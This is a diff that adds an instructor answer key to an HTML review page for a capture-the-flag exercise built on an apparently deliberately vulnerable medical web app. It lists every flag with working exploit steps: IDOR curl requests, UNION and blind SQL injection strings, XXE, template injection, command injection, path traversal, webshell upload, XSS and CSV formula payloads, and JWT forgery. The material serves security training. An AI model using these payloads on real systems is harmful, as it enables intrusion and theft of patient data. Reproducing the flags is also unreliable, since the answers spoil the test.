@@ -52,11 +52,44 @@
   .fixnote{font-size:12px;color:var(--muted);border-left:3px solid var(--red);padding:6px 12px;background:rgba(248,81,73,.06);border-radius:0 6px 6px 0;margin:12px 0}
   section{display:none} section.active{display:block}
   @media(max-width:760px){.wrap{flex-direction:column}nav{flex:none;position:static;max-height:none;border-right:none;border-bottom:1px solid var(--border);display:flex;flex-wrap:wrap}nav button{width:auto}}
-</style>
+
+    /* --- instructor answer key --- */
+    .spoiler-banner{background:#3a1414;border:1px solid #b03535;color:#ffd7d7;padding:12px 16px;border-radius:6px;margin:16px 0;font-size:14px}
+    .ans{margin:8px 0 4px;padding:8px 10px;border:1px dashed #b58900;border-radius:5px;background:#2a2410}
+    .ans .lbl{font-weight:700;color:#e3b341;font-size:12px;letter-spacing:.05em}
+    .ans .status{font-size:10px;padding:1px 6px;border-radius:8px;margin-left:6px;font-family:monospace}
+    .ans .ok{background:#123d1c;color:#3fb950;border:1px solid #2a7a3f}
+    .ans .pending{background:#3a2410;color:#e3b341;border:1px solid #7a5a2a}
+    .ans .flag{font-family:monospace;color:#7ee787;margin:5px 0;font-size:13px;user-select:all}
+    .ans .how{font-size:12.5px;color:#c9d1d9;line-height:1.5}
+
+  </style>
 </head>
 <body>
 <header>
   <h1>MediConnect CTF — Challenge Review</h1>
+<div class="spoiler-banner"><b>INSTRUCTOR ANSWER KEY.</b> Every flag + capture steps. Full spoilers. <b>PLACED</b> (53) = exploit yields the flag today (verified); <b>PENDING</b> = seeded+submittable, not yet positioned.</div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
   <p>53 capture-the-flag challenges across the OWASP Top 10 (2025), quality-driven and uneven per category. Each flag is retrieved by performing the real exploit, then submitted for verification. Finding IDs (<span class="fid">#nn</span>) trace to <code>VULN_FIX_MAP.md</code>. Difficulty and points shown per card.</p>
 </header>
 <div class="wrap">
@@ -147,46 +180,46 @@
     <h2>A01 — Broken Access Control</h2>
     <p class="catmeta">Acting on resources you don't own or roles you don't hold. The app enforces almost no authorization.</p>
 
-    <div class="card"><h3>IDOR — read any object by id <span class="badge b-easy">EASY</span><span class="fid">#42</span><span class="pts">100</span></h3>
+    <div class="card"><h3>IDOR — read any object by id <span class="badge b-easy">EASY</span><span class="fid">#42</span><span class="pts">100</span></h3><div class="ans"><span class="lbl">ANSWER #42</span><span class="status ok">PLACED</span><div class="flag">flag{a01_idor_read_any_object_by_id_19ab47}</div><div class="how"><code>curl -s http://localhost:8085/api/appointments/patient/2</code> (no ownership check). Flag in <code>notes</code> of appt 19.</div></div>
       <p><b>Do</b> Read another user's appointment/record by guessing the id.</p>
       <p><b>Path</b> <code>GET /api/appointments/{id}</code> with an id that isn't yours — no ownership check; flag in the returned object.</p>
       <p><b>Code</b> <span class="ref">AppointmentController GET /{id}</span></p>
       <p class="shared">● Shared flag — same pattern on #52 lab-results, #36 users, #89 patients, #107 medical-records, #197 doctor chart, #57 messages. Any path captures it.</p></div>
 
-    <div class="card"><h3>IDOR via query param <span class="badge b-med">MEDIUM</span><span class="fid">#94</span><span class="pts">200</span></h3>
+    <div class="card"><h3>IDOR via query param <span class="badge b-med">MEDIUM</span><span class="fid">#94</span><span class="pts">200</span></h3><div class="ans"><span class="lbl">ANSWER #94</span><span class="status ok">PLACED</span><div class="flag">flag{a01_idor_via_query_param_717caf}</div><div class="how"><code>curl -s 'http://localhost:8085/api/messages/conversations?userId=6' -H 'Authorization: Bearer &lt;t&gt;'</code> (userId of a participant you are not - doctor2=6 or patient3=5). Flag is the conversation <code>lastMessage</code>.</div></div>
       <p><b>Do</b> Read another user's conversations by tampering a query param.</p>
       <p><b>Path</b> <code>GET /api/messages/conversations?userId=</code> — userId not verified against the JWT subject.</p>
       <p><b>Code</b> <span class="ref">MessageController</span></p>
       <p class="twist">● Distinct twist — query-param IDOR (vs path-param #42); teaches parameter tampering.</p></div>
 
-    <div class="card"><h3>Function-level access — returns-all <span class="badge b-easy">EASY</span><span class="fid">#93</span><span class="pts">100</span></h3>
+    <div class="card"><h3>Function-level access — returns-all <span class="badge b-easy">EASY</span><span class="fid">#93</span><span class="pts">100</span></h3><div class="ans"><span class="lbl">ANSWER #93</span><span class="status ok">PLACED</span><div class="flag">flag{a01_function_level_access_returns_all_b9d383}</div><div class="how"><code>curl -s http://localhost:8085/api/medical-records</code> (returns every row). Flag in a record's <code>diagnosis</code>.</div></div>
       <p><b>Do</b> List every patient's medical records without a role.</p>
       <p><b>Path</b> <code>GET /api/medical-records</code> returns all rows regardless of caller role.</p>
       <p><b>Code</b> <span class="ref">MedicalRecordController</span></p>
       <p class="shared">● Shared flag — with #40 all-users, #62 admin-users.</p></div>
 
-    <div class="card"><h3>permitAll on protected routes <span class="badge b-med">MEDIUM</span><span class="fid">#191</span><span class="pts">200</span></h3>
+    <div class="card"><h3>permitAll on protected routes <span class="badge b-med">MEDIUM</span><span class="fid">#191</span><span class="pts">200</span></h3><div class="ans"><span class="lbl">ANSWER #191</span><span class="status ok">PLACED</span><div class="flag">flag{a01_permitall_on_protected_routes_55de41}</div><div class="how"><code>/api/doctor/**</code> is permitAll(): <code>curl -s -H 'Authorization: Bearer &lt;t&gt;' http://localhost:8085/api/doctor/notes</code>. Flag in a note's <code>renderedHtml</code>.</div></div>
       <p><b>Do</b> Hit doctor-only endpoints as a patient.</p>
       <p><b>Path</b> All seven <code>/api/doctor/**</code> controllers are <code>permitAll()</code>; call one directly; flag behind it.</p>
       <p><b>Code</b> <span class="ref">SecurityConfig</span></p></div>
 
-    <div class="card"><h3>Privilege escalation — role mass-assignment <span class="badge b-easy">EASY</span><span class="fid">#38</span><span class="pts">100</span></h3>
+    <div class="card"><h3>Privilege escalation — role mass-assignment <span class="badge b-easy">EASY</span><span class="fid">#38</span><span class="pts">100</span></h3><div class="ans"><span class="lbl">ANSWER #38</span><span class="status ok">PLACED</span><div class="flag">flag{a01_privilege_escalation_role_mass_assignment_d4ba63}</div><div class="how">Behavioral: <code>PUT /api/users/{id}/role {"role":"ADMIN"}</code> (no authority check). Then <code>GET /api/ctf/behavior/a01-privilege-escalation-role-mass-assignment</code>.</div></div>
       <p><b>Do</b> Set your own role via an update call.</p>
       <p><b>Path</b> <code>PUT /api/users/{id}/role</code> takes the role from the body with no authority check → become ADMIN → read admin flag.</p>
       <p><b>Code</b> <span class="ref">UserController</span></p></div>
 
-    <div class="card"><h3>Identity spoofing via request body <span class="badge b-med">MEDIUM</span><span class="fid">#56</span><span class="pts">200</span></h3>
+    <div class="card"><h3>Identity spoofing via request body <span class="badge b-med">MEDIUM</span><span class="fid">#56</span><span class="pts">200</span></h3><div class="ans"><span class="lbl">ANSWER #56</span><span class="status ok">PLACED</span><div class="flag">flag{a01_identity_spoofing_via_request_body_86a283}</div><div class="how">Behavioral: <code>POST /api/messages</code> with a body <code>senderId</code> different from your JWT id (spoof). Then <code>GET /api/ctf/behavior/a01-identity-spoofing-via-request-body</code>.</div></div>
       <p><b>Do</b> Act as another user by supplying their id.</p>
       <p><b>Path</b> <code>POST /api/messages</code> trusts <code>senderId</code> from the body → send/read as someone else.</p>
       <p><b>Code</b> <span class="ref">MessageService</span></p>
       <p class="shared">● Shared flag — same trust bug in #109 pharmacistId, #186 broadcast, #231 prescription, #257 appointment actor.</p></div>
 
-    <div class="card"><h3>Auth-context takeover — impersonation <span class="badge b-hard">HARD</span><span class="fid">#151</span><span class="pts">300</span></h3>
+    <div class="card"><h3>Auth-context takeover — impersonation <span class="badge b-hard">HARD</span><span class="fid">#151</span><span class="pts">300</span></h3><div class="ans"><span class="lbl">ANSWER #151</span><span class="status ok">PLACED</span><div class="flag">flag{a01_auth_context_takeover_impersonation_ac2dc1}</div><div class="how">Behavioral: <code>POST /api/admin/users/{id}/impersonate</code> mints a token for another identity (no impersonated_by/audit). Then <code>GET /api/ctf/behavior/a01-auth-context-takeover-impersonation</code>.</div></div>
       <p><b>Do</b> Mint a valid session for any user.</p>
       <p><b>Path</b> <code>POST /api/admin/users/{id}/impersonate</code> issues a JWT for that user → use it → read admin flag.</p>
       <p><b>Code</b> <span class="ref">AdminUserService#impersonate</span></p></div>
 
-    <div class="card"><h3>Workflow bypass — force dispense <span class="badge b-hard">HARD</span><span class="fid">#173</span><span class="pts">300</span></h3>
+    <div class="card"><h3>Workflow bypass — force dispense <span class="badge b-hard">HARD</span><span class="fid">#173</span><span class="pts">300</span></h3><div class="ans"><span class="lbl">ANSWER #173</span><span class="status ok">PLACED</span><div class="flag">flag{a01_workflow_bypass_force_dispense_a6fe2f}</div><div class="how">Behavioral: <code>POST /api/admin/prescriptions/{id}/force-dispense</code> bypasses queue/validator/role. Then <code>GET /api/ctf/behavior/a01-workflow-bypass-force-dispense</code>.</div></div>
       <p><b>Do</b> Dispense a prescription skipping the pharmacist workflow entirely.</p>
       <p><b>Path</b> <code>AdminClinicalService#forceDispense</code> bypasses queue + validator + role → illegitimate dispense yields flag.</p>
       <p><b>Code</b> <span class="ref">AdminClinicalService#forceDispense</span></p></div>
@@ -197,24 +230,24 @@
     <h2>A02 — Security Misconfiguration</h2>
     <p class="catmeta">Dangerous defaults: disabled protections, exposed introspection, runtime-mutable ops.</p>
 
-    <div class="card"><h3>Blanket SecurityConfig weakening <span class="badge b-easy">EASY</span><span class="fid">#28</span><span class="pts">100</span></h3>
+    <div class="card"><h3>Blanket SecurityConfig weakening <span class="badge b-easy">EASY</span><span class="fid">#28</span><span class="pts">100</span></h3><div class="ans"><span class="lbl">ANSWER #28</span><span class="status ok">PLACED</span><div class="flag">flag{a02_blanket_securityconfig_weakening_1b60fd}</div><div class="how">Send a state-changing request with a foreign Origin: <code>curl -X POST .../api/appointments/1/status -H 'Origin: http://attacker.evil'</code>, then <code>GET /api/ctf/behavior/a02-blanket-securityconfig-weakening</code>.</div></div>
       <p><b>Do</b> Exploit disabled CSRF / wildcard CORS / dropped security headers / all-endpoints-open.</p>
       <p><b>Path</b> Cluster #28/#30/#31/#22 — demonstrate a cross-origin or header-based attack that the missing defenses allow; flag on success.</p>
       <p><b>Code</b> <span class="ref">SecurityConfig</span></p>
       <p class="shared">● Shared flag — one misconfig cluster.</p></div>
 
-    <div class="card"><h3>NoOpPasswordEncoder <span class="badge b-med">MEDIUM</span><span class="fid">#32</span><span class="pts">200</span></h3>
+    <div class="card"><h3>NoOpPasswordEncoder <span class="badge b-med">MEDIUM</span><span class="fid">#32</span><span class="pts">200</span></h3><div class="ans"><span class="lbl">ANSWER #32</span><span class="status ok">PLACED</span><div class="flag">flag{a02_nooppasswordencoder_8422c0}</div><div class="how">Submit a user's leaked <code>passwordHash</code> (from #11) AS the password: <code>POST /api/auth/login {"username":"patient1","password":"&lt;md5 hash&gt;"}</code>, then <code>GET /api/ctf/behavior/a02-nooppasswordencoder</code>.</div></div>
       <p><b>Do</b> Exploit plaintext-comparison password handling.</p>
       <p><b>Path</b> The registered <code>NoOpPasswordEncoder</code> compares passwords as plaintext; combine with a hash/DB leak to authenticate → flag.</p>
       <p><b>Code</b> <span class="ref">SecurityConfig</span></p>
       <p class="twist">● Distinct twist from the blanket cluster.</p></div>
 
-    <div class="card"><h3>Config / secrets dump <span class="badge b-med">MEDIUM</span><span class="fid">#64</span><span class="pts">200</span></h3>
+    <div class="card"><h3>Config / secrets dump <span class="badge b-med">MEDIUM</span><span class="fid">#64</span><span class="pts">200</span></h3><div class="ans"><span class="lbl">ANSWER #64</span><span class="status ok">PLACED</span><div class="flag">flag{a02_config_secrets_dump_caf015}</div><div class="how"><code>curl -s http://localhost:8085/api/admin/config | grep flag</code>. Flag is <code>mediconnect.internal.metadata-token</code>.</div></div>
       <p><b>Do</b> Read raw server configuration incl. secrets.</p>
       <p><b>Path</b> <code>GET /api/admin/config</code> returns the raw <code>Environment</code> (also Actuator #4); flag is a seeded property.</p>
       <p><b>Code</b> <span class="ref">AdminService /admin/config</span></p></div>
 
-    <div class="card"><h3>Destructive ops endpoint (System.exit) <span class="badge b-hard">HARD</span><span class="fid">#169</span><span class="pts">300</span></h3>
+    <div class="card"><h3>Destructive ops endpoint (System.exit) <span class="badge b-hard">HARD</span><span class="fid">#169</span><span class="pts">300</span></h3><div class="ans"><span class="lbl">ANSWER #169</span><span class="status ok">PLACED</span><div class="flag">flag{a02_destructive_ops_endpoint_system_exit_9a44af}</div><div class="how">Behavioral: <code>curl -H 'Authorization: Bearer &lt;t&gt;' -X POST http://localhost:8085/api/admin/maintenance/restart</code> reaches the destructive restart (permitAll). Then <code>GET /api/ctf/behavior/a02-destructive-ops-endpoint-system-exit</code> returns the flag. (System.exit(0) removed so the demo can't brick the app - plan bucket 4.)</div></div>
       <p><b>Do</b> Trigger a denial-of-service by design.</p>
       <p><b>Path</b> <code>AdminOpsService#restart</code> calls <code>System.exit(0)</code>; reaching it (via permitAll) kills the app. Flag awarded for demonstrating the exposed control, then fixed for stability.</p>
       <p><b>Code</b> <span class="ref">AdminOpsService#restart</span></p></div>
@@ -225,24 +258,24 @@
     <h2>A03 — Software Supply Chain / Dangerous Library Features</h2>
     <p class="catmeta">Dangerous, outdated, or misused library features. Deserialization lives in A08.</p>
 
-    <div class="card"><h3>XXE — unhardened XML parser <span class="badge b-med">MEDIUM</span><span class="fid">#206</span><span class="pts">200</span></h3>
+    <div class="card"><h3>XXE — unhardened XML parser <span class="badge b-med">MEDIUM</span><span class="fid">#206</span><span class="pts">200</span></h3><div class="ans"><span class="lbl">ANSWER #206</span><span class="status ok">PLACED</span><div class="flag">flag{a03_xxe_unhardened_xml_parser_9e8608}</div><div class="how">XXE: <code>POST /api/doctor/notes/import</code> a multipart XML with an external entity reading a local file (<code>&lt;!ENTITY xxe SYSTEM "file://.../ctf-flags/a03-xxe-unhardened-xml-parser.txt"&gt;</code>) used as <code>&lt;body&gt;&amp;xxe;&lt;/body&gt;</code>. Flag reflected in <code>renderedHtml</code>.</div></div>
       <p><b>Do</b> Read a local file via an XML external entity.</p>
       <p><b>Path</b> <code>DoctorNoteService#importXml</code> uses default <code>DocumentBuilderFactory</code>; submit XML with an external entity pointing at the flag file.</p>
       <p><b>Code</b> <span class="ref">DoctorNoteService#importXml</span></p>
       <p class="shared">● Shared flag — same defaults in #163 audit template.</p></div>
 
-    <div class="card"><h3>SSTI — Freemarker inline eval <span class="badge b-med">MEDIUM</span><span class="fid">#204</span><span class="pts">200</span></h3>
+    <div class="card"><h3>SSTI — Freemarker inline eval <span class="badge b-med">MEDIUM</span><span class="fid">#204</span><span class="pts">200</span></h3><div class="ans"><span class="lbl">ANSWER #204</span><span class="status ok">PLACED</span><div class="flag">flag{a03_ssti_freemarker_inline_eval_4cbefd}</div><div class="how">SSTI (Freemarker inline): POST /api/doctor/notes with a templateBody using freemarker.template.utility.Execute to run <code>cat ctf-flags/a03-ssti-freemarker-inline-eval.txt</code>. renderedHtml = command output = flag.</div></div>
       <p><b>Do</b> Evaluate a server-side template expression.</p>
       <p><b>Path</b> <code>TemplateRenderer#renderInline</code> renders attacker input as a Freemarker template (via note create) → expression executes → flag.</p>
       <p><b>Code</b> <span class="ref">TemplateRenderer#renderInline</span></p></div>
 
-    <div class="card"><h3>SSTI — template path traversal <span class="badge b-hard">HARD</span><span class="fid">#205</span><span class="pts">300</span></h3>
+    <div class="card"><h3>SSTI — template path traversal <span class="badge b-hard">HARD</span><span class="fid">#205</span><span class="pts">300</span></h3><div class="ans"><span class="lbl">ANSWER #205</span><span class="status ok">PLACED</span><div class="flag">flag{a03_ssti_template_path_traversal_1757f6}</div><div class="how">SSTI template name: <code>renderByName</code> has no allow-list. <code>POST /api/doctor/notes {"templateName":"a03-ssti-template-path-traversal"}</code> loads the seeded hidden template; renderedHtml = flag. (Freemarker normalizes away <code>../</code>, so the real vuln is the missing name allow-list.)</div></div>
       <p><b>Do</b> Select an arbitrary template file by name.</p>
       <p><b>Path</b> <code>TemplateRenderer#renderByName</code> resolves a caller-chosen name with no allow-list → load an unintended template → flag.</p>
       <p><b>Code</b> <span class="ref">TemplateRenderer#renderByName</span></p>
       <p class="twist">● Distinct twist — file-selection vs expression eval.</p></div>
 
-    <div class="card"><h3>Nashorn eval RCE (deprecated engine) <span class="badge b-hard">HARD</span><span class="fid">#229</span><span class="pts">300</span></h3>
+    <div class="card"><h3>Nashorn eval RCE (deprecated engine) <span class="badge b-hard">HARD</span><span class="fid">#229</span><span class="pts">300</span></h3><div class="ans"><span class="lbl">ANSWER #229</span><span class="status ok">PLACED</span><div class="flag">flag{a03_nashorn_eval_rce_deprecated_engine_b2d71b}</div><div class="how">SSRF-&gt;RCE: <code>POST /api/doctor/drug-interactions/check {"catalogueUrl":"http://&lt;you&gt;/payload.js"}</code>. Server fetches + Nashorn <code>eval()</code>s it. payload.js reads <code>ctf-flags/a03-nashorn-eval-rce.txt</code> via java.io. Flag in <code>result.normalized</code>.</div></div>
       <p><b>Do</b> Execute code via the bundled JS engine.</p>
       <p><b>Path</b> <code>DoctorPrescribingService#drugInteractions</code> <code>eval()</code>s a fetched body (the dangerous <code>nashorn-core:15.6</code> dep); return JS that reads the flag file.</p>
       <p><b>Code</b> <span class="ref">DoctorPrescribingService#drugInteractions</span> · <span class="ref">pom.xml</span></p>
@@ -254,29 +287,29 @@
     <h2>A04 — Cryptographic Failures</h2>
     <p class="catmeta">Weak hashing, hardcoded keys, predictable randomness, secrets exposed to clients.</p>
 
-    <div class="card"><h3>MD5 unsalted passwords <span class="badge b-easy">EASY</span><span class="fid">#20</span><span class="pts">100</span></h3>
+    <div class="card"><h3>MD5 unsalted passwords <span class="badge b-easy">EASY</span><span class="fid">#20</span><span class="pts">100</span></h3><div class="ans"><span class="lbl">ANSWER #20</span><span class="status ok">PLACED</span><div class="flag">flag{a04_md5_unsalted_passwords_7d3851}</div><div class="how">Harvest the hash via #11, crack the unsalted MD5 (<code>0571749e...=sunshine</code>), then <code>POST /api/auth/login {"username":"crackme","password":"sunshine"}</code> and <code>GET /api/ctf/behavior/a04-md5-unsalted-passwords</code>.</div></div>
       <p><b>Do</b> Recover a password from its hash.</p>
       <p><b>Path</b> <code>PasswordUtils</code> stores unsalted MD5; crack a leaked hash and log in as the target → flag.</p>
       <p><b>Code</b> <span class="ref">PasswordUtils</span></p></div>
 
-    <div class="card"><h3>passwordHash exposed in responses <span class="badge b-easy">EASY</span><span class="fid">#11</span><span class="pts">100</span></h3>
+    <div class="card"><h3>passwordHash exposed in responses <span class="badge b-easy">EASY</span><span class="fid">#11</span><span class="pts">100</span></h3><div class="ans"><span class="lbl">ANSWER #11</span><span class="status ok">PLACED</span><div class="flag">flag{a04_passwordhash_exposed_in_responses_b703d4}</div><div class="how"><code>curl -s http://localhost:8085/api/users -H 'Authorization: Bearer &lt;jwt&gt;'</code>. Flag is the <code>passwordHash</code> of user <code>records_svc</code>.</div></div>
       <p><b>Do</b> Harvest a password hash straight from the API.</p>
       <p><b>Path</b> <code>User</code>/<code>UserDto</code> serialize <code>passwordHash</code>; read it from any user response, then crack (feeds #20).</p>
       <p><b>Code</b> <span class="ref">User.java / UserDto</span></p>
       <p class="shared">● Shared flag — same leak in #37, #154.</p></div>
 
-    <div class="card"><h3>Hardcoded JWT signing secret <span class="badge b-med">MEDIUM</span><span class="fid">#16</span><span class="pts">200</span></h3>
+    <div class="card"><h3>Hardcoded JWT signing secret <span class="badge b-med">MEDIUM</span><span class="fid">#16</span><span class="pts">200</span></h3><div class="ans"><span class="lbl">ANSWER #16</span><span class="status ok">PLACED</span><div class="flag">flag{a04_hardcoded_jwt_signing_secret_313077}</div><div class="how">Forge JWT (secret <code>mediconnect-super-secret-2024</code>, 32B pad), <code>{sub:'admin',iat,exp}</code> (<b>exp required</b>). <code>curl -H 'Authorization: Bearer &lt;forged&gt;' http://localhost:8085/api/ctf/admin-secret</code>.</div></div>
       <p><b>Do</b> Forge an admin JWT.</p>
       <p><b>Path</b> Secret is hardcoded (<code>mediconnect-super-secret-2024</code>); sign a token with <code>role: ADMIN</code> → admin flag.</p>
       <p><b>Code</b> <span class="ref">JwtUtil</span></p></div>
 
-    <div class="card"><h3>Plaintext PII at rest <span class="badge b-easy">EASY</span><span class="fid">#7</span><span class="pts">100</span></h3>
+    <div class="card"><h3>Plaintext PII at rest <span class="badge b-easy">EASY</span><span class="fid">#7</span><span class="pts">100</span></h3><div class="ans"><span class="lbl">ANSWER #7</span><span class="status ok">PLACED</span><div class="flag">flag{a04_plaintext_pii_at_rest_106dfd}</div><div class="how">Plaintext PII: <code>curl -s -H 'Authorization: Bearer &lt;t&gt;' http://localhost:8085/api/patients/by-user/4</code> (patient2 = user 4). Flag is <code>insuranceNumber</code>.</div></div>
       <p><b>Do</b> Read sensitive PII stored/returned unencrypted &amp; unmasked.</p>
       <p><b>Path</b> PII columns are plaintext and exposed unmasked in DTOs; flag hidden in a sensitive field.</p>
       <p><b>Code</b> <span class="ref">V2 migration / DTOs</span></p>
       <p class="shared">● Shared flag — with #12 unmasked fields.</p></div>
 
-    <div class="card"><h3>Predictable RNG on reset <span class="badge b-hard">HARD</span><span class="fid">#153</span><span class="pts">300</span></h3>
+    <div class="card"><h3>Predictable RNG on reset <span class="badge b-hard">HARD</span><span class="fid">#153</span><span class="pts">300</span></h3><div class="ans"><span class="lbl">ANSWER #153</span><span class="status ok">PLACED</span><div class="flag">flag{a04_predictable_rng_on_reset_37c8a1}</div><div class="how">Reset issues Random(SEED_BASE+id). Reproduce it offline, log in as the target, then <code>GET /api/ctf/behavior/a04-predictable-rng-on-reset</code>.</div></div>
       <p><b>Do</b> Predict a generated reset password.</p>
       <p><b>Path</b> <code>generateRandomPassword</code> uses <code>java.util.Random</code>; predict the sequence, hijack the reset, read the flag.</p>
       <p><b>Code</b> <span class="ref">AdminUserService#generateRandomPassword</span></p></div>
@@ -287,46 +320,46 @@
     <h2>A05 — Injection</h2>
     <p class="catmeta">Untrusted input reaches an interpreter: SQL, OS shell, template, filesystem, CSV, the DOM.</p>
 
-    <div class="card"><h3>SQL injection (UNION) <span class="badge b-med">MEDIUM</span><span class="fid">#51</span><span class="pts">200</span></h3>
+    <div class="card"><h3>SQL injection (UNION) <span class="badge b-med">MEDIUM</span><span class="fid">#51</span><span class="pts">200</span></h3><div class="ans"><span class="lbl">ANSWER #51</span><span class="status ok">PLACED</span><div class="flag">flag{a05_sql_injection_union_a8d8bf}</div><div class="how">UNION SQLi: <code>curl -G --data-urlencode "status=' UNION SELECT NULL,NULL,NULL,flag,NULL,NULL,NULL,status_ok,NULL,NULL,NULL,NULL FROM ctf_secret -- " http://localhost:8085/api/lab-results/search</code>. Flag in <code>testName</code>.</div></div>
       <p><b>Do</b> Dump a hidden flag row via SQLi.</p>
       <p><b>Path</b> <code>GET /api/lab-results/search</code> concatenates 4 params into SQL; inject <code>UNION SELECT</code> to pull the flag.</p>
       <p><b>Code</b> <span class="ref">LabResultService#search</span></p>
       <p class="shared">● Shared flag — same bug in #41, #158, #165, #267.</p></div>
 
-    <div class="card"><h3>Blind/boolean SQLi (multi-clause) <span class="badge b-hard">HARD</span><span class="fid">#194</span><span class="pts">300</span></h3>
+    <div class="card"><h3>Blind/boolean SQLi (multi-clause) <span class="badge b-hard">HARD</span><span class="fid">#194</span><span class="pts">300</span></h3><div class="ans"><span class="lbl">ANSWER #194</span><span class="status ok">PLACED</span><div class="flag">flag{a05_blind_boolean_sqli_multi_clause_69f1ca}</div><div class="how">Row-count oracle: <code>q=a%') AND (SELECT SUBSTRING(flag,N,1) FROM ctf_secret WHERE label='a05-blind-boolean-sqli-multi-clause')='X' -- </code>. Rows &gt; 0 = char match; extract char by char.</div></div>
       <p><b>Do</b> Extract data with no direct output.</p>
       <p><b>Path</b> <code>DoctorRosterService#listPatients</code> concatenates <code>q</code>/<code>active</code>/<code>recentDays</code> into multiple clauses → boolean-blind extraction of the flag.</p>
       <p><b>Code</b> <span class="ref">DoctorRosterService#listPatients</span></p>
       <p class="twist">● Distinct twist — blind vs UNION.</p></div>
 
-    <div class="card"><h3>Stored XSS → admin bot <span class="badge b-med">MEDIUM</span><span class="fid">#55</span><span class="pts">200</span></h3>
+    <div class="card"><h3>Stored XSS → admin bot <span class="badge b-med">MEDIUM</span><span class="fid">#55</span><span class="pts">200</span></h3><div class="ans"><span class="lbl">ANSWER #55</span><span class="status ok">PLACED</span><div class="flag">flag{a05_stored_xss_admin_bot_e52c3c}</div><div class="how">Server-side XSS detection (no browser): <code>POST /api/messages</code> with an executable payload (e.g. <code>content="&lt;img src=x onerror=alert(1)&gt;"</code>), then <code>GET /api/ctf/xss/check</code>. The detector confirms the unescaped vector survived in your stored messages and returns the flag.</div></div>
       <p><b>Do</b> Execute script in an admin context.</p>
       <p><b>Path</b> <code>POST /api/messages</code> stores raw HTML; a simulated admin victim-bot renders it and the payload posts an admin secret to <code>/api/ctf/xss-callback</code> → flag.</p>
       <p><b>Code</b> <span class="ref">MessageService</span> · <span class="ref">victim-bot (to build)</span></p></div>
 
-    <div class="card"><h3>Command injection <span class="badge b-hard">HARD</span><span class="fid">#170</span><span class="pts">300</span></h3>
+    <div class="card"><h3>Command injection <span class="badge b-hard">HARD</span><span class="fid">#170</span><span class="pts">300</span></h3><div class="ans"><span class="lbl">ANSWER #170</span><span class="status ok">PLACED</span><div class="flag">flag{a05_command_injection_4f52ca}</div><div class="how">Command injection: <code>curl -G --data-urlencode 'dbName=mediconnect_db; cat ctf-flags/a05-command-injection.txt' http://localhost:8085/api/admin/maintenance/backup</code>. Flag in reflected stdout.</div></div>
       <p><b>Do</b> Run an OS command.</p>
       <p><b>Path</b> <code>POST /api/admin/ops/backup?dbName=</code> passes the param to a shell; inject <code>; cat /ctf-flags/a05.txt</code>.</p>
       <p><b>Code</b> <span class="ref">AdminOpsService#backup</span></p></div>
 
-    <div class="card"><h3>Path traversal — read <span class="badge b-easy">EASY</span><span class="fid">#48</span><span class="pts">100</span></h3>
+    <div class="card"><h3>Path traversal — read <span class="badge b-easy">EASY</span><span class="fid">#48</span><span class="pts">100</span></h3><div class="ans"><span class="lbl">ANSWER #48</span><span class="status ok">PLACED</span><div class="flag">flag{a05_path_traversal_read_8faf25}</div><div class="how">Path traversal: <code>curl -s 'http://localhost:8085/api/lab-results/1/file?filePath=ctf-flags/a05-path-traversal-read.txt'</code>.</div></div>
       <p><b>Do</b> Read an arbitrary file off disk.</p>
       <p><b>Path</b> <code>MedicalRecordService</code> uses a caller <code>filePath</code> unsanitized; <code>../</code> to the flag file.</p>
       <p><b>Code</b> <span class="ref">MedicalRecordService</span></p>
       <p class="shared">● Shared flag — with #54.</p></div>
 
-    <div class="card"><h3>Path traversal — write <span class="badge b-med">MEDIUM</span><span class="fid">#47</span><span class="pts">200</span></h3>
+    <div class="card"><h3>Path traversal — write <span class="badge b-med">MEDIUM</span><span class="fid">#47</span><span class="pts">200</span></h3><div class="ans"><span class="lbl">ANSWER #47</span><span class="status ok">PLACED</span><div class="flag">flag{a05_path_traversal_write_827484}</div><div class="how">Upload with filename <code>../probe.txt</code> so the write lands outside uploadDir: <code>POST /api/medical-records/{id}/attachment</code>, then <code>GET /api/ctf/behavior/a05-path-traversal-write</code>.</div></div>
       <p><b>Do</b> Write a file outside the upload dir.</p>
       <p><b>Path</b> Upload uses <code>getOriginalFilename()</code> verbatim; a traversal filename writes anywhere. Flag confirms placement.</p>
       <p><b>Code</b> <span class="ref">MedicalRecordService</span></p>
       <p class="shared">● Shared flag — with #218, #181.</p></div>
 
-    <div class="card"><h3>Unrestricted file upload <span class="badge b-easy">EASY</span><span class="fid">#46</span><span class="pts">100</span></h3>
+    <div class="card"><h3>Unrestricted file upload <span class="badge b-easy">EASY</span><span class="fid">#46</span><span class="pts">100</span></h3><div class="ans"><span class="lbl">ANSWER #46</span><span class="status ok">PLACED</span><div class="flag">flag{a05_unrestricted_file_upload_16574b}</div><div class="how">Upload <code>shell.php</code> (or .jsp/.exe/.svg/.html): <code>POST /api/medical-records/{id}/attachment</code>, then <code>GET /api/ctf/behavior/a05-unrestricted-file-upload</code>.</div></div>
       <p><b>Do</b> Upload a disallowed file type.</p>
       <p><b>Path</b> Attachment endpoint enforces no type/size; upload an executable/script; flag on acceptance.</p>
       <p><b>Code</b> <span class="ref">MedicalRecordService (POST attachment)</span></p></div>
 
-    <div class="card"><h3>CSV formula injection <span class="badge b-med">MEDIUM</span><span class="fid">#264</span><span class="pts">200</span></h3>
+    <div class="card"><h3>CSV formula injection <span class="badge b-med">MEDIUM</span><span class="fid">#264</span><span class="pts">200</span></h3><div class="ans"><span class="lbl">ANSWER #264</span><span class="status ok">PLACED</span><div class="flag">flag{a05_csv_formula_injection_d71149}</div><div class="how">Store a formula note on an appointment (<code>POST /api/appointments {"notes":"=WEBSERVICE(...)"}</code>), then <code>GET /api/doctor/appointments/export.csv</code> and <code>GET /api/ctf/behavior/a05-csv-formula-injection</code>.</div></div>
       <p><b>Do</b> Inject a spreadsheet formula via export.</p>
       <p><b>Path</b> <code>DoctorAppointmentService#exportCsv</code> writes note cells unescaped; a <code>=</code>-prefixed payload executes on open. Flag on crafted export.</p>
       <p><b>Code</b> <span class="ref">DoctorAppointmentService#exportCsv</span></p></div>
@@ -337,18 +370,18 @@
     <h2>A06 — Insecure Design</h2>
     <p class="catmeta">Flaws in the logic and trust model, not a single missing check.</p>
 
-    <div class="card"><h3>Missing state machine — dispense <span class="badge b-med">MEDIUM</span><span class="fid">#59</span><span class="pts">200</span></h3>
